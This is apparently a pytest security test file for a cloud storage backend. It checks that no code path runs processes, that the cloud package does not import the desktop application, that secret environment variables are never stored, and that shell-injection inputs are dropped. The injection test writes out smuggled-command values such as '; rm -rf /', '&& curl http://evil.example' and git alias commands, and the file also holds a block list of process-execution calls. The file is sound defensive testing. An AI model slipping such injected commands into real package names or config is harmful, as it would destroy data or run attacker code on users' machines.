"""Security tests: no execution, no secrets, no accidental coupling.

The backend is a storage service. These tests fail loudly if any code
path tries to run a process, or if the cloud package starts importing
the desktop application.
"""

import os
import subprocess
from pathlib import Path

import pytest

CLOUD_ROOT = Path(__file__).resolve().parents[2]

SOURCE_DIRECTORIES = (
    CLOUD_ROOT / "accounts",
    CLOUD_ROOT / "setups",
    CLOUD_ROOT / "config",
)

FORBIDDEN_EXECUTION_PATTERNS = (
    "import subprocess",
    "from subprocess",
    "subprocess.",
    "os.system(",
    "os.popen(",
    "os.exec",
    "os.spawn",
    "Popen(",
    "shell=True",
)


def python_sources():
    for directory in SOURCE_DIRECTORIES:
        for path in directory.rglob("*.py"):
            if "tests" in path.parts:
                continue

            yield path


def test_backend_source_contains_no_process_execution():
    offenders = []

    for path in python_sources():
        text = path.read_text(encoding="utf-8")

        for pattern in FORBIDDEN_EXECUTION_PATTERNS:
            if pattern in text:
                offenders.append(f"{path.name}: {pattern}")

    assert offenders == []


def test_backend_does_not_import_the_desktop_application():
    offenders = []

    for path in python_sources():
        for line in path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()

            if stripped.startswith(("import app", "from app")):
                offenders.append(f"{path.name}: {stripped}")

    assert offenders == []


def test_creating_setup_never_runs_a_command(
    auth_client,
    monkeypatch,
):
    def boom(*args, **kwargs):
        raise AssertionError("The backend must never execute a process.")

    for name in (
        "run",
        "call",
        "check_call",
        "check_output",
        "Popen",
    ):
        monkeypatch.setattr(subprocess, name, boom)

    monkeypatch.setattr(os, "system", boom)
    monkeypatch.setattr(os, "popen", boom)

    response = auth_client.post(
        "/api/setups/",
        {
            "name": "No execution",
            "data": {
                "format_version": 2,
                "applications": [
                    {
                        "name": "Git",
                        "installed": True,
                        "package_id": "Git.Git",
                    },
                    {
                        "name": "Node.js",
                        "installed": True,
                        "package_id": "OpenJS.NodeJS.LTS",
                    },
                ],
                "git_config": {
                    "user.name": "Alice",
                    "core.editor": "code --wait",
                },
                "python_packages": ["Django==5.2.4"],
                "npm_packages": ["typescript"],
                "wsl_distributions": [{"name": "Ubuntu", "version": 2}],
                "environment_variables": {"NODE_ENV": "production"},
            },
        },
        format="json",
    )

    assert response.status_code == 201


def test_shell_metacharacters_are_dropped_not_executed(auth_client):
    response = auth_client.post(
        "/api/setups/",
        {
            "name": "Injection attempt",
            "data": {
                "format_version": 2,
                "python_packages": [
                    "safe-package==1.0; touch /tmp/pwned",
                    "other==2.0 && curl http://evil.example",
                ],
                "npm_packages": [
                    "good; rm -rf /",
                    "good2 && whoami",
                ],
                "git_config": {
                    "core.editor": "sh -c 'touch /tmp/pwned'",
                    "alias.x": "!touch /tmp/pwned",
                },
            },
        },
        format="json",
    )

    assert response.status_code == 201

    data = response.json()["data"]

    assert data["python_packages"] == []
    assert data["npm_packages"] == []
    assert "alias.x" not in data["git_config"]
    assert "evil.example" not in str(data)


def test_stored_setup_never_contains_secret_values(auth_client):
    response = auth_client.post(
        "/api/setups/",
        {
            "name": "Secrets",
            "data": {
                "format_version": 2,
                "environment_variables": {
                    "GITHUB_TOKEN": "ghp_secret_value",
                    "AWS_SECRET_ACCESS_KEY": "aws_secret_value",
                    "SAFE": "visible",
                },
            },
        },
        format="json",
    )

    assert response.status_code == 201

    raw = response.content.decode("utf-8")

    assert "ghp_secret_value" not in raw
    assert "aws_secret_value" not in raw
    assert "visible" in raw
